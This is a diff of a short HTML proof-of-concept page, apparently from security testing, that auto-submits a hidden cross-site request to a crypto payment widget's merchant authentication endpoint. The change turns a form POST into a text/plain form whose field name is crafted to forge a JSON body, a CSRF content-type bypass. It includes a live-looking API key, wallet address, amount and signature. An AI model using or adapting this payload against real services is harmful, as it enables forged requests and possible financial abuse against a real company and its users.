@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-AUTH-M</title></head>
+<html><head><meta charset="utf-8"><title>ATK-JSON</title></head>
 <body>
-<form id="f" method="POST" action="https://widget.swapped.com/api/v1/merchant/authenticate">
-<input type="hidden" name="url" value="https://widget.swapped.com?apiKey=pk_live_bf928a1d16cbf9f4e4b1280d87c30dc5&currencyCode=OSMO&walletAddress=osmo1w508d6qejxtdg4y5r3zarvary0c5xw7kjxy2e2&baseCurrencyCode=USD&baseCurrencyAmount=200&style=9a4e4a18a5725bf1c9237c1297549aa0&signature=MFeyv6B0UVH3NGSYhhzM3CqDj%2FIde30nwJZkl5lzpUI%3D">
+<form id="f" method="POST" action="https://widget.swapped.com/api/v1/merchant/authenticate" enctype="text/plain">
+<input type="hidden" name='{"url":"https://widget.swapped.com?apiKey=pk_live_bf928a1d16cbf9f4e4b1280d87c30dc5&currencyCode=OSMO&walletAddress=osmo1w508d6qejxtdg4y5r3zarvary0c5xw7kjxy2e2&baseCurrencyCode=USD&baseCurrencyAmount=200&style=9a4e4a18a5725bf1c9237c1297549aa0&signature=MFeyv6B0UVH3NGSYhhzM3CqDj%2FIde30nwJZkl5lzpUI%3D","zzz":"' value='"}'>
 </form>
 <script>document.getElementById('f').submit();</script>
 </body></html>
